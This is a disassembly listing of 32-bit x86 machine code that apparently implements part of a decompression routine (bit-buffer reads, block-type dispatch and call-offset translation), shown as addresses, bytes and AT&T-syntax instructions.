 1007cbc:	59                   	pop    %ecx
 1007cbd:	33 c0                	xor    %eax,%eax
 1007cbf:	8d ba b8 0c 00 00    	lea    0xcb8(%edx),%edi
 1007cc5:	f3 ab                	rep stos %eax,%es:(%edi)
 1007cc7:	aa                   	stos   %al,%es:(%edi)
 1007cc8:	6a 3e                	push   $0x3e
 1007cca:	59                   	pop    %ecx
 1007ccb:	33 c0                	xor    %eax,%eax
 1007ccd:	8d ba b4 2d 00 00    	lea    0x2db4(%edx),%edi
 1007cd3:	f3 ab                	rep stos %eax,%es:(%edi)
 1007cd5:	aa                   	stos   %al,%es:(%edi)
 1007cd6:	5f                   	pop    %edi
 1007cd7:	5e                   	pop    %esi
 1007cd8:	5d                   	pop    %ebp
 1007cd9:	c2 04 00             	ret    $0x4
 1007cdc:	cc                   	int3
 1007cdd:	cc                   	int3
 1007cde:	cc                   	int3
 1007cdf:	cc                   	int3
 1007ce0:	cc                   	int3
 1007ce1:	8b ff                	mov    %edi,%edi
 1007ce3:	55                   	push   %ebp
 1007ce4:	8b ec                	mov    %esp,%ebp
 1007ce6:	8b 45 08             	mov    0x8(%ebp),%eax
 1007ce9:	33 c9                	xor    %ecx,%ecx
 1007ceb:	41                   	inc    %ecx
 1007cec:	33 d2                	xor    %edx,%edx
 1007cee:	89 48 0c             	mov    %ecx,0xc(%eax)
 1007cf1:	89 48 10             	mov    %ecx,0x10(%eax)
 1007cf4:	89 48 14             	mov    %ecx,0x14(%eax)
 1007cf7:	89 90 c0 2e 00 00    	mov    %edx,0x2ec0(%eax)
 1007cfd:	89 90 10 2b 00 00    	mov    %edx,0x2b10(%eax)
 1007d03:	89 88 dc 2e 00 00    	mov    %ecx,0x2edc(%eax)
 1007d09:	89 90 d4 2e 00 00    	mov    %edx,0x2ed4(%eax)
 1007d0f:	89 90 d8 2e 00 00    	mov    %edx,0x2ed8(%eax)
 1007d15:	89 88 b8 2e 00 00    	mov    %ecx,0x2eb8(%eax)
 1007d1b:	89 90 c4 2e 00 00    	mov    %edx,0x2ec4(%eax)
 1007d21:	89 90 bc 2e 00 00    	mov    %edx,0x2ebc(%eax)
 1007d27:	5d                   	pop    %ebp
 1007d28:	c2 04 00             	ret    $0x4
 1007d2b:	cc                   	int3
 1007d2c:	cc                   	int3
 1007d2d:	cc                   	int3
 1007d2e:	cc                   	int3
 1007d2f:	cc                   	int3
 1007d30:	8b ff                	mov    %edi,%edi
 1007d32:	55                   	push   %ebp
 1007d33:	8b ec                	mov    %esp,%ebp
 1007d35:	8b 45 08             	mov    0x8(%ebp),%eax
 1007d38:	83 a0 c8 2e 00 00 00 	andl   $0x0,0x2ec8(%eax)
 1007d3f:	5d                   	pop    %ebp
 1007d40:	c2 04 00             	ret    $0x4
 1007d43:	cc                   	int3
 1007d44:	cc                   	int3
 1007d45:	cc                   	int3
 1007d46:	cc                   	int3
 1007d47:	cc                   	int3
 1007d48:	8b ff                	mov    %edi,%edi
 1007d4a:	55                   	push   %ebp
 1007d4b:	8b ec                	mov    %esp,%ebp
 1007d4d:	83 ec 14             	sub    $0x14,%esp
 1007d50:	a1 28 c0 00 01       	mov    0x100c028,%eax
 1007d55:	8b 4d 08             	mov    0x8(%ebp),%ecx
 1007d58:	8b 55 0c             	mov    0xc(%ebp),%edx
 1007d5b:	53                   	push   %ebx
 1007d5c:	8b 5d 10             	mov    0x10(%ebp),%ebx
 1007d5f:	83 fb 06             	cmp    $0x6,%ebx
 1007d62:	89 45 fc             	mov    %eax,-0x4(%ebp)
 1007d65:	7f 0b                	jg     0x1007d72
 1007d67:	01 99 c8 2e 00 00    	add    %ebx,0x2ec8(%ecx)
 1007d6d:	e9 89 00 00 00       	jmp    0x1007dfb
 1007d72:	56                   	push   %esi
 1007d73:	57                   	push   %edi
 1007d74:	8d 04 1a             	lea    (%edx,%ebx,1),%eax
 1007d77:	8d 70 fa             	lea    -0x6(%eax),%esi
 1007d7a:	8d 7d f4             	lea    -0xc(%ebp),%edi
 1007d7d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
 1007d7e:	89 45 f0             	mov    %eax,-0x10(%ebp)
 1007d81:	66 a5                	movsw  %ds:(%esi),%es:(%edi)
 1007d83:	8b 7d f0             	mov    -0x10(%ebp),%edi
 1007d86:	83 c7 fa             	add    $0xfffffffa,%edi
 1007d89:	b8 e8 e8 e8 e8       	mov    $0xe8e8e8e8,%eax
 1007d8e:	ab                   	stos   %eax,%es:(%edi)
 1007d8f:	66 ab                	stos   %ax,%es:(%edi)
 1007d91:	8b 81 c8 2e 00 00    	mov    0x2ec8(%ecx),%eax
 1007d97:	8d 5c 18 f6          	lea    -0xa(%eax,%ebx,1),%ebx
 1007d9b:	89 5d ec             	mov    %ebx,-0x14(%ebp)
 1007d9e:	eb 07                	jmp    0x1007da7
 1007da0:	42                   	inc    %edx
 1007da1:	ff 81 c8 2e 00 00    	incl   0x2ec8(%ecx)
 1007da7:	80 3a e8             	cmpb   $0xe8,(%edx)
 1007daa:	75 f4                	jne    0x1007da0
 1007dac:	8b b9 c8 2e 00 00    	mov    0x2ec8(%ecx),%edi
 1007db2:	42                   	inc    %edx
 1007db3:	3b fb                	cmp    %ebx,%edi
 1007db5:	73 2d                	jae    0x1007de4
 1007db7:	8b 02                	mov    (%edx),%eax
 1007db9:	8b b1 c4 2e 00 00    	mov    0x2ec4(%ecx),%esi
 1007dbf:	3b c6                	cmp    %esi,%eax
 1007dc1:	73 06                	jae    0x1007dc9
 1007dc3:	2b c7                	sub    %edi,%eax
 1007dc5:	89 02                	mov    %eax,(%edx)
 1007dc7:	eb 0c                	jmp    0x1007dd5
 1007dc9:	8b d8                	mov    %eax,%ebx
 1007dcb:	f7 db                	neg    %ebx
 1007dcd:	3b df                	cmp    %edi,%ebx
 1007dcf:	77 04                	ja     0x1007dd5
 1007dd1:	03 f0                	add    %eax,%esi
 1007dd3:	89 32                	mov    %esi,(%edx)
 1007dd5:	8b 5d ec             	mov    -0x14(%ebp),%ebx
 1007dd8:	83 c2 04             	add    $0x4,%edx
 1007ddb:	83 81 c8 2e 00 00 05 	addl   $0x5,0x2ec8(%ecx)
 1007de2:	eb c3                	jmp    0x1007da7
 1007de4:	8b 7d f0             	mov    -0x10(%ebp),%edi
 1007de7:	83 c3 0a             	add    $0xa,%ebx
 1007dea:	83 c7 fa             	add    $0xfffffffa,%edi
 1007ded:	89 99 c8 2e 00 00    	mov    %ebx,0x2ec8(%ecx)
 1007df3:	8d 75 f4             	lea    -0xc(%ebp),%esi
 1007df6:	a5                   	movsl  %ds:(%esi),%es:(%edi)
 1007df7:	66 a5                	movsw  %ds:(%esi),%es:(%edi)
 1007df9:	5f                   	pop    %edi
 1007dfa:	5e                   	pop    %esi
 1007dfb:	8b 4d fc             	mov    -0x4(%ebp),%ecx
 1007dfe:	5b                   	pop    %ebx
 1007dff:	e8 fb e4 ff ff       	call   0x10062ff
 1007e04:	c9                   	leave
 1007e05:	c2 0c 00             	ret    $0xc
 1007e08:	cc                   	int3
 1007e09:	cc                   	int3
 1007e0a:	cc                   	int3
 1007e0b:	cc                   	int3
 1007e0c:	cc                   	int3
 1007e0d:	8b ff                	mov    %edi,%edi
 1007e0f:	55                   	push   %ebp
 1007e10:	8b ec                	mov    %esp,%ebp
 1007e12:	51                   	push   %ecx
 1007e13:	53                   	push   %ebx
 1007e14:	8b 5d 08             	mov    0x8(%ebp),%ebx
 1007e17:	56                   	push   %esi
 1007e18:	57                   	push   %edi
 1007e19:	33 ff                	xor    %edi,%edi
 1007e1b:	89 7d fc             	mov    %edi,-0x4(%ebp)
 1007e1e:	e9 d6 01 00 00       	jmp    0x1007ff9
 1007e23:	83 bb dc 2e 00 00 01 	cmpl   $0x1,0x2edc(%ebx)
 1007e2a:	0f 85 a4 01 00 00    	jne    0x1007fd4
 1007e30:	8d 83 b8 2e 00 00    	lea    0x2eb8(%ebx),%eax
 1007e36:	39 38                	cmp    %edi,(%eax)
 1007e38:	74 33                	je     0x1007e6d
 1007e3a:	6a 01                	push   $0x1
 1007e3c:	53                   	push   %ebx
 1007e3d:	89 38                	mov    %edi,(%eax)
 1007e3f:	e8 1b 03 00 00       	call   0x100815f
 1007e44:	85 c0                	test   %eax,%eax
 1007e46:	74 1f                	je     0x1007e67
 1007e48:	6a 10                	push   $0x10
 1007e4a:	53                   	push   %ebx
 1007e4b:	e8 0f 03 00 00       	call   0x100815f
 1007e50:	6a 10                	push   $0x10
 1007e52:	53                   	push   %ebx
 1007e53:	8b f0                	mov    %eax,%esi
 1007e55:	e8 05 03 00 00       	call   0x100815f
 1007e5a:	c1 e6 10             	shl    $0x10,%esi
 1007e5d:	0b c6                	or     %esi,%eax
 1007e5f:	89 83 c4 2e 00 00    	mov    %eax,0x2ec4(%ebx)
 1007e65:	eb 06                	jmp    0x1007e6d
 1007e67:	89 bb c4 2e 00 00    	mov    %edi,0x2ec4(%ebx)
 1007e6d:	83 bb d8 2e 00 00 03 	cmpl   $0x3,0x2ed8(%ebx)
 1007e74:	75 28                	jne    0x1007e9e
 1007e76:	f6 83 d0 2e 00 00 01 	testb  $0x1,0x2ed0(%ebx)
 1007e7d:	74 13                	je     0x1007e92
 1007e7f:	8d 83 04 2b 00 00    	lea    0x2b04(%ebx),%eax
 1007e85:	8b 08                	mov    (%eax),%ecx
 1007e87:	3b 8b 08 2b 00 00    	cmp    0x2b08(%ebx),%ecx
 1007e8d:	73 03                	jae    0x1007e92
 1007e8f:	41                   	inc    %ecx
 1007e90:	89 08                	mov    %ecx,(%eax)
 1007e92:	53                   	push   %ebx
 1007e93:	89 bb d8 2e 00 00    	mov    %edi,0x2ed8(%ebx)
 1007e99:	e8 9a 01 00 00       	call   0x1008038
 1007e9e:	6a 03                	push   $0x3
 1007ea0:	53                   	push   %ebx
 1007ea1:	e8 b9 02 00 00       	call   0x100815f
 1007ea6:	6a 08                	push   $0x8
 1007ea8:	53                   	push   %ebx
 1007ea9:	89 83 d8 2e 00 00    	mov    %eax,0x2ed8(%ebx)
 1007eaf:	e8 ab 02 00 00       	call   0x100815f
 1007eb4:	6a 08                	push   $0x8
 1007eb6:	53                   	push   %ebx
 1007eb7:	8b f0                	mov    %eax,%esi
 1007eb9:	e8 a1 02 00 00       	call   0x100815f
 1007ebe:	6a 08                	push   $0x8
 1007ec0:	53                   	push   %ebx
 1007ec1:	8b f8                	mov    %eax,%edi
 1007ec3:	e8 97 02 00 00       	call   0x100815f
 1007ec8:	c1 e6 08             	shl    $0x8,%esi
 1007ecb:	03 f7                	add    %edi,%esi
 1007ecd:	c1 e6 08             	shl    $0x8,%esi
 1007ed0:	03 c6                	add    %esi,%eax
 1007ed2:	83 bb d8 2e 00 00 02 	cmpl   $0x2,0x2ed8(%ebx)
 1007ed9:	89 83 d0 2e 00 00    	mov    %eax,0x2ed0(%ebx)
 1007edf:	89 83 d4 2e 00 00    	mov    %eax,0x2ed4(%ebx)
 1007ee5:	75 06                	jne    0x1007eed
 1007ee7:	53                   	push   %ebx
 1007ee8:	e8 1a 16 00 00       	call   0x1009507
 1007eed:	8b 83 d8 2e 00 00    	mov    0x2ed8(%ebx),%eax
 1007ef3:	83 f8 01             	cmp    $0x1,%eax
 1007ef6:	74 1c                	je     0x1007f14
 1007ef8:	83 f8 02             	cmp    $0x2,%eax
 1007efb:	74 17                	je     0x1007f14
 1007efd:	83 f8 03             	cmp    $0x3,%eax
 1007f00:	75 0a                	jne    0x1007f0c
 1007f02:	53                   	push   %ebx
 1007f03:	e8 14 03 00 00       	call   0x100821c
 1007f08:	85 c0                	test   %eax,%eax
 1007f0a:	75 53                	jne    0x1007f5f
 1007f0c:	83 c8 ff             	or     $0xffffffff,%eax
 1007f0f:	e9 18 01 00 00       	jmp    0x100802c
 1007f14:	0f b6 8b b5 2e 00 00 	movzbl 0x2eb5(%ebx),%ecx
 1007f1b:	8d 0c cd 00 01 00 00 	lea    0x100(,%ecx,8),%ecx
 1007f22:	b8 a0 02 00 00       	mov    $0x2a0,%eax
 1007f27:	3b c8                	cmp    %eax,%ecx
 1007f29:	7c 02                	jl     0x1007f2d
 1007f2b:	8b c8                	mov    %eax,%ecx
 1007f2d:	8b c1                	mov    %ecx,%eax
 1007f2f:	c1 e9 02             	shr    $0x2,%ecx
 1007f32:	8d b3 18 0a 00 00    	lea    0xa18(%ebx),%esi
 1007f38:	8d bb 14 2b 00 00    	lea    0x2b14(%ebx),%edi
 1007f3e:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
 1007f40:	8b c8                	mov    %eax,%ecx
 1007f42:	83 e1 03             	and    $0x3,%ecx
 1007f45:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
 1007f47:	6a 3e                	push   $0x3e
 1007f49:	59                   	pop    %ecx
 1007f4a:	8d b3 b8 0c 00 00    	lea    0xcb8(%ebx),%esi
 1007f50:	8d bb b4 2d 00 00    	lea    0x2db4(%ebx),%edi
 1007f56:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
 1007f58:	53                   	push   %ebx
 1007f59:	a4                   	movsb  %ds:(%esi),%es:(%edi)
 1007f5a:	e8 d9 14 00 00       	call   0x1009438
 1007f5f:	c7 83 dc 2e 00 00 02 	movl   $0x2,0x2edc(%ebx)
 1007f66:	00 00 00 
 1007f69:	33 ff                	xor    %edi,%edi
 1007f6b:	eb 67                	jmp    0x1007fd4
 1007f6d:	39 7d 0c             	cmp    %edi,0xc(%ebp)
 1007f70:	7e 6a                	jle    0x1007fdc
 1007f72:	8b b3 d4 2e 00 00    	mov    0x2ed4(%ebx),%esi
 1007f78:	3b 75 0c             	cmp    0xc(%ebp),%esi
 1007f7b:	7c 03                	jl     0x1007f80
 1007f7d:	8b 75 0c             	mov    0xc(%ebp),%esi
 1007f80:	3b f7                	cmp    %edi,%esi
 1007f82:	74 88                	je     0x1007f0c
 1007f84:	8b 8b d8 2e 00 00    	mov    0x2ed8(%ebx),%ecx
 1007f8a:	83 f9 02             	cmp    $0x2,%ecx
 1007f8d:	8b 83 c0 2e 00 00    	mov    0x2ec0(%ebx),%eax
 1007f93:	75 0a                	jne    0x1007f9f
 1007f95:	56                   	push   %esi
 1007f96:	50                   	push   %eax
 1007f97:	53                   	push   %ebx
 1007f98:	e8 c7 10 00 00       	call   0x1009064
 1007f9d:	eb 21                	jmp    0x1007fc0
 1007f9f:	83 f9 01             	cmp    $0x1,%ecx
 1007fa2:	75 0a                	jne    0x1007fae
 1007fa4:	56                   	push   %esi
 1007fa5:	50                   	push   %eax
 1007fa6:	53                   	push   %ebx
 1007fa7:	e8 08 09 00 00       	call   0x10088b4
 1007fac:	eb 12                	jmp    0x1007fc0
 1007fae:	83 f9 03             	cmp    $0x3,%ecx
 1007fb1:	75 0a                	jne    0x1007fbd
 1007fb3:	56                   	push   %esi
 1007fb4:	50                   	push   %eax
 1007fb5:	53                   	push   %ebx
 1007fb6:	e8 d0 01 00 00       	call   0x100818b
 1007fbb:	eb 03                	jmp    0x1007fc0
 1007fbd:	83 c8 ff             	or     $0xffffffff,%eax
 1007fc0:	3b c7                	cmp    %edi,%eax
 1007fc2:	0f 85 44 ff ff ff    	jne    0x1007f0c
 1007fc8:	29 b3 d4 2e 00 00    	sub    %esi,0x2ed4(%ebx)
 1007fce:	29 75 0c             	sub    %esi,0xc(%ebp)
 1007fd1:	01 75 fc             	add    %esi,-0x4(%ebp)
 1007fd4:	39 bb d4 2e 00 00    	cmp    %edi,0x2ed4(%ebx)
 1007fda:	7f 91                	jg     0x1007f6d
 1007fdc:	39 bb d4 2e 00 00    	cmp    %edi,0x2ed4(%ebx)
 1007fe2:	75 0a                	jne    0x1007fee
 1007fe4:	c7 83 dc 2e 00 00 01 	movl   $0x1,0x2edc(%ebx)
 1007feb:	00 00 00 
 1007fee:	39 7d 0c             	cmp    %edi,0xc(%ebp)
 1007ff1:	75 09                	jne    0x1007ffc
 1007ff3:	53                   	push   %ebx
 1007ff4:	e8 3f 00 00 00       	call   0x1008038
 1007ff9:	39 7d 0c             	cmp    %edi,0xc(%ebp)
 1007ffc:	0f 8f 21 fe ff ff    	jg     0x1007e23
 1008002:	8b 83 c0 2e 00 00    	mov    0x2ec0(%ebx),%eax
 1008008:	3b c7                	cmp    %edi,%eax
 100800a:	75 03                	jne    0x100800f
 100800c:	8b 43 04             	mov    0x4(%ebx),%eax
 100800f:	2b 45 fc             	sub    -0x4(%ebp),%eax
 1008012:	b9 00 98 00 00       	mov    $0x9800,%ecx
 1008017:	03 03                	add    (%ebx),%eax
 1008019:	39 4d fc             	cmp    %ecx,-0x4(%ebp)
 100801c:	7d 03                	jge    0x1008021
 100801e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
 1008021:	50                   	push   %eax
 1008022:	51                   	push   %ecx
 1008023:	53                   	push   %ebx
 1008024:	e8 a0 10 00 00       	call   0x10090c9
 1008029:	8b 45 fc             	mov    -0x4(%ebp),%eax
 100802c:	5f                   	pop    %edi
 100802d:	5e                   	pop    %esi
 100802e:	5b                   	pop    %ebx
 100802f:	c9                   	leave
 1008030:	c2 08 00             	ret    $0x8
 1008033:	cc                   	int3
 1008034:	cc                   	int3
 1008035:	cc                   	int3
 1008036:	cc                   	int3
 1008037:	cc                   	int3
 1008038:	8b ff                	mov    %edi,%edi
 100803a:	55                   	push   %ebp
 100803b:	8b ec                	mov    %esp,%ebp
 100803d:	8b 4d 08             	mov    0x8(%ebp),%ecx
 1008040:	83 b9 d8 2e 00 00 03 	cmpl   $0x3,0x2ed8(%ecx)
 1008047:	74 41                	je     0x100808a
 1008049:	8b 81 04 2b 00 00    	mov    0x2b04(%ecx),%eax
 100804f:	56                   	push   %esi
 1008050:	8d 70 04             	lea    0x4(%eax),%esi
 1008053:	3b b1 08 2b 00 00    	cmp    0x2b08(%ecx),%esi
 1008059:	77 2e                	ja     0x1008089
 100805b:	33 d2                	xor    %edx,%edx
 100805d:	8a 70 01             	mov    0x1(%eax),%dh
 1008060:	57                   	push   %edi
 1008061:	0f b6 78 03          	movzbl 0x3(%eax),%edi
 1008065:	8a 10                	mov    (%eax),%dl
 1008067:	0f b6 40 02          	movzbl 0x2(%eax),%eax
 100806b:	c6 81 b4 2e 00 00 10 	movb   $0x10,0x2eb4(%ecx)
 1008072:	89 b1 04 2b 00 00    	mov    %esi,0x2b04(%ecx)
 1008078:	c1 e2 08             	shl    $0x8,%edx
 100807b:	0b d7                	or     %edi,%edx
 100807d:	c1 e2 08             	shl    $0x8,%edx
 1008080:	0b d0                	or     %eax,%edx
 1008082:	89 91 b0 2e 00 00    	mov    %edx,0x2eb0(%ecx)
 1008088:	5f                   	pop    %edi
 1008089:	5e                   	pop    %esi
 100808a:	5d                   	pop    %ebp
 100808b:	c2 04 00             	ret    $0x4
 100808e:	cc                   	int3
 100808f:	cc                   	int3
 1008090:	cc                   	int3
 1008091:	cc                   	int3
 1008092:	cc                   	int3
 1008093:	8b ff                	mov    %edi,%edi
 1008095:	55                   	push   %ebp
 1008096:	8b ec                	mov    %esp,%ebp
 1008098:	5d                   	pop    %ebp
 1008099:	e9 9a ff ff ff       	jmp    0x1008038
 100809e:	cc                   	int3
 100809f:	cc                   	int3
 10080a0:	cc                   	int3
 10080a1:	cc                   	int3
 10080a2:	cc                   	int3
 10080a3:	8b ff                	mov    %edi,%edi
 10080a5:	55                   	push   %ebp
 10080a6:	8b ec                	mov    %esp,%ebp
 10080a8:	8b 45 08             	mov    0x8(%ebp),%eax
 10080ab:	8b 4d 0c             	mov    0xc(%ebp),%ecx
 10080ae:	28 88 b4 2e 00 00    	sub    %cl,0x2eb4(%eax)
 10080b4:	d3 a0 b0 2e 00 00    	shll   %cl,0x2eb0(%eax)
 10080ba:	8a 90 b4 2e 00 00    	mov    0x2eb4(%eax),%dl
 10080c0:	84 d2                	test   %dl,%dl
 10080c2:	57                   	push   %edi
 10080c3:	8b b8 b0 2e 00 00    	mov    0x2eb0(%eax),%edi
 10080c9:	0f 8f 86 00 00 00    	jg     0x1008155
 10080cf:	56                   	push   %esi
 10080d0:	8b b0 04 2b 00 00    	mov    0x2b04(%eax),%esi
 10080d6:	3b b0 08 2b 00 00    	cmp    0x2b08(%eax),%esi
 10080dc:	72 0c                	jb     0x10080ea
 10080de:	c7 80 bc 2e 00 00 01 	movl   $0x1,0x2ebc(%eax)
 10080e5:	00 00 00 
 10080e8:	eb 6a                	jmp    0x1008154
 10080ea:	53                   	push   %ebx
 10080eb:	33 db                	xor    %ebx,%ebx
 10080ed:	8a 7e 01             	mov    0x1(%esi),%bh
 10080f0:	33 c9                	xor    %ecx,%ecx
 10080f2:	8a ca                	mov    %dl,%cl
 10080f4:	80 c2 10             	add    $0x10,%dl
 10080f7:	8a 1e                	mov    (%esi),%bl
 10080f9:	83 c6 02             	add    $0x2,%esi
 10080fc:	f7 d9                	neg    %ecx
 10080fe:	89 b0 04 2b 00 00    	mov    %esi,0x2b04(%eax)
 1008104:	88 90 b4 2e 00 00    	mov    %dl,0x2eb4(%eax)
 100810a:	d3 e3                	shl    %cl,%ebx
 100810c:	0b df                	or     %edi,%ebx
 100810e:	84 d2                	test   %dl,%dl
 1008110:	89 98 b0 2e 00 00    	mov    %ebx,0x2eb0(%eax)
 1008116:	7f 3b                	jg     0x1008153
 1008118:	3b b0 08 2b 00 00    	cmp    0x2b08(%eax),%esi
 100811e:	72 0c                	jb     0x100812c
 1008120:	c7 80 bc 2e 00 00 01 	movl   $0x1,0x2ebc(%eax)
 1008127:	00 00 00 
 100812a:	eb 27                	jmp    0x1008153
 100812c:	33 db                	xor    %ebx,%ebx
 100812e:	8a 7e 01             	mov    0x1(%esi),%bh
 1008131:	33 c9                	xor    %ecx,%ecx
 1008133:	8a ca                	mov    %dl,%cl
 1008135:	8a 1e                	mov    (%esi),%bl
 1008137:	83 c6 02             	add    $0x2,%esi
 100813a:	f7 d9                	neg    %ecx
 100813c:	89 b0 04 2b 00 00    	mov    %esi,0x2b04(%eax)
 1008142:	d3 e3                	shl    %cl,%ebx
 1008144:	09 98 b0 2e 00 00    	or     %ebx,0x2eb0(%eax)
 100814a:	80 c2 10             	add    $0x10,%dl
 100814d:	88 90 b4 2e 00 00    	mov    %dl,0x2eb4(%eax)
 1008153:	5b                   	pop    %ebx
 1008154:	5e                   	pop    %esi
 1008155:	5f                   	pop    %edi
 1008156:	5d                   	pop    %ebp
 1008157:	c2 08 00             	ret    $0x8
 100815a:	cc                   	int3
 100815b:	cc                   	int3
 100815c:	cc                   	int3
 100815d:	cc                   	int3
 100815e:	cc                   	int3
 100815f:	8b ff                	mov    %edi,%edi
 1008161:	55                   	push   %ebp
 1008162:	8b ec                	mov    %esp,%ebp
 1008164:	8b 45 08             	mov    0x8(%ebp),%eax
 1008167:	56                   	push   %esi
 1008168:	8b b0 b0 2e 00 00    	mov    0x2eb0(%eax),%esi
 100816e:	6a 20                	push   $0x20
 1008170:	59                   	pop    %ecx
 1008171:	ff 75 0c             	push   0xc(%ebp)
 1008174:	2b 4d 0c             	sub    0xc(%ebp),%ecx
 1008177:	50                   	push   %eax
 1008178:	d3 ee                	shr    %cl,%esi
 100817a:	e8 24 ff ff ff       	call   0x10080a3
 100817f:	8b c6                	mov    %esi,%eax
 1008181:	5e                   	pop    %esi
 1008182:	5d                   	pop    %ebp
 1008183:	c2 08 00             	ret    $0x8
 1008186:	cc                   	int3
 1008187:	cc                   	int3
 1008188:	cc                   	int3
 1008189:	cc                   	int3
 100818a:	cc                   	int3
 100818b:	8b ff                	mov    %edi,%edi
 100818d:	55                   	push   %ebp
 100818e:	8b ec                	mov    %esp,%ebp
 1008190:	8b 45 10             	mov    0x10(%ebp),%eax
 1008193:	8b 4d 08             	mov    0x8(%ebp),%ecx
 1008196:	8b 91 04 2b 00 00    	mov    0x2b04(%ecx),%edx
 100819c:	53                   	push   %ebx
 100819d:	56                   	push   %esi
 100819e:	8b 75 0c             	mov    0xc(%ebp),%esi
 10081a1:	57                   	push   %edi
 10081a2:	8d 3c 06             	lea    (%esi,%eax,1),%edi
 10081a5:	3b f7                	cmp    %edi,%esi
 10081a7:	8b de                	mov    %esi,%ebx
 10081a9:	89 5d 0c             	mov    %ebx,0xc(%ebp)
 10081ac:	7d 24                	jge    0x10081d2
 10081ae:	3b 91 08 2b 00 00    	cmp    0x2b08(%ecx),%edx
 10081b4:	73 33                	jae    0x10081e9
 10081b6:	8b 41 04             	mov    0x4(%ecx),%eax
 10081b9:	05 05 01 00 00       	add    $0x105,%eax
 10081be:	3b f0                	cmp    %eax,%esi
 10081c0:	7d 27                	jge    0x10081e9
 10081c2:	8a 1a                	mov    (%edx),%bl
 10081c4:	8b 01                	mov    (%ecx),%eax
 10081c6:	88 1c 06             	mov    %bl,(%esi,%eax,1)
 10081c9:	46                   	inc    %esi
 10081ca:	42                   	inc    %edx
 10081cb:	3b f7                	cmp    %edi,%esi
 10081cd:	7c df                	jl     0x10081ae
 10081cf:	8b 5d 0c             	mov    0xc(%ebp),%ebx
 10081d2:	b8 01 01 00 00       	mov    $0x101,%eax
 10081d7:	3b f8                	cmp    %eax,%edi
 10081d9:	89 91 04 2b 00 00    	mov    %edx,0x2b04(%ecx)
 10081df:	89 45 0c             	mov    %eax,0xc(%ebp)
 10081e2:	7f 18                	jg     0x10081fc
 10081e4:	89 7d 0c             	mov    %edi,0xc(%ebp)
 10081e7:	eb 13                	jmp    0x10081fc
 10081e9:	83 c8 ff             	or     $0xffffffff,%eax
 10081ec:	eb 22                	jmp    0x1008210
 10081ee:	8b 01                	mov    (%ecx),%eax
 10081f0:	8b 51 04             	mov    0x4(%ecx),%edx
 10081f3:	03 d0                	add    %eax,%edx
 10081f5:	8a 04 18             	mov    (%eax,%ebx,1),%al
 10081f8:	88 04 1a             	mov    %al,(%edx,%ebx,1)
 10081fb:	43                   	inc    %ebx
 10081fc:	3b 5d 0c             	cmp    0xc(%ebp),%ebx
 10081ff:	72 ed                	jb     0x10081ee
 1008201:	8b 41 08             	mov    0x8(%ecx),%eax
 1008204:	23 c6                	and    %esi,%eax
 1008206:	89 81 c0 2e 00 00    	mov    %eax,0x2ec0(%ecx)
 100820c:	8b c6                	mov    %esi,%eax
 100820e:	2b c7                	sub    %edi,%eax
 1008210:	5f                   	pop    %edi
 1008211:	5e                   	pop    %esi
 1008212:	5b                   	pop    %ebx
 1008213:	5d                   	pop    %ebp
 1008214:	c2 0c 00             	ret    $0xc
 1008217:	cc                   	int3
 1008218:	cc                   	int3
 1008219:	cc                   	int3
 100821a:	cc                   	int3
 100821b:	cc                   	int3
 100821c:	8b ff                	mov    %edi,%edi
 100821e:	55                   	push   %ebp
 100821f:	8b ec                	mov    %esp,%ebp
 1008221:	8b 45 08             	mov    0x8(%ebp),%eax
 1008224:	83 80 04 2b 00 00 fe 	addl   $0xfffffffe,0x2b04(%eax)
 100822b:	8b 88 04 2b 00 00    	mov    0x2b04(%eax),%ecx
 1008231:	83 c1 04             	add    $0x4,%ecx
 1008234:	3b 88 08 2b 00 00    	cmp    0x2b08(%eax),%ecx
 100823a:	72 04                	jb     0x1008240
 100823c:	33 c0                	xor    %eax,%eax
 100823e:	eb 3d                	jmp    0x100827d
 1008240:	53                   	push   %ebx
 1008241:	56                   	push   %esi
 1008242:	57                   	push   %edi
 1008243:	6a 03                	push   $0x3
 1008245:	8d 70 0c             	lea    0xc(%eax),%esi
 1008248:	5f                   	pop    %edi
 1008249:	8b 88 04 2b 00 00    	mov    0x2b04(%eax),%ecx
 100824f:	0f b6 59 01          	movzbl 0x1(%ecx),%ebx
 1008253:	33 d2                	xor    %edx,%edx
 1008255:	8a 71 03             	mov    0x3(%ecx),%dh
 1008258:	8a 51 02             	mov    0x2(%ecx),%dl
 100825b:	0f b6 09             	movzbl (%ecx),%ecx
 100825e:	c1 e2 08             	shl    $0x8,%edx
 1008261:	0b d3                	or     %ebx,%edx
 1008263:	c1 e2 08             	shl    $0x8,%edx
 1008266:	0b d1                	or     %ecx,%edx
 1008268:	89 16                	mov    %edx,(%esi)
 100826a:	83 80 04 2b 00 00 04 	addl   $0x4,0x2b04(%eax)
 1008271:	83 c6 04             	add    $0x4,%esi
 1008274:	4f                   	dec    %edi
 1008275:	75 d2                	jne    0x1008249
 1008277:	5f                   	pop    %edi
 1008278:	33 c0                	xor    %eax,%eax
 100827a:	5e                   	pop    %esi
 100827b:	40                   	inc    %eax
 100827c:	5b                   	pop    %ebx
 100827d:	5d                   	pop    %ebp
 100827e:	c2 04 00             	ret    $0x4
 1008281:	cc                   	int3
 1008282:	cc                   	int3
 1008283:	cc                   	int3
 1008284:	cc                   	int3
 1008285:	cc                   	int3
 1008286:	8b ff                	mov    %edi,%edi
 1008288:	55                   	push   %ebp
 1008289:	8b ec                	mov    %esp,%ebp
 100828b:	83 ec 14             	sub    $0x14,%esp
 100828e:	8b 8a b0 2e 00 00    	mov    0x2eb0(%edx),%ecx
 1008294:	8a 82 b4 2e 00 00    	mov    0x2eb4(%edx),%al
 100829a:	89 4d f8             	mov    %ecx,-0x8(%ebp)
 100829d:	8b 8a 04 2b 00 00    	mov    0x2b04(%edx),%ecx
 10082a3:	89 4d f4             	mov    %ecx,-0xc(%ebp)
 10082a6:	8b 8a 08 2b 00 00    	mov    0x2b08(%edx),%ecx
 10082ac:	53                   	push   %ebx
 10082ad:	56                   	push   %esi
 10082ae:	8b 75 0c             	mov    0xc(%ebp),%esi
 10082b1:	89 4d f0             	mov    %ecx,-0x10(%ebp)
 10082b4:	8b 4d 08             	mov    0x8(%ebp),%ecx
 10082b7:	03 f1                	add    %ecx,%esi
 10082b9:	3b ce                	cmp    %esi,%ecx
 10082bb:	57                   	push   %edi
 10082bc:	88 45 ff             	mov    %al,-0x1(%ebp)
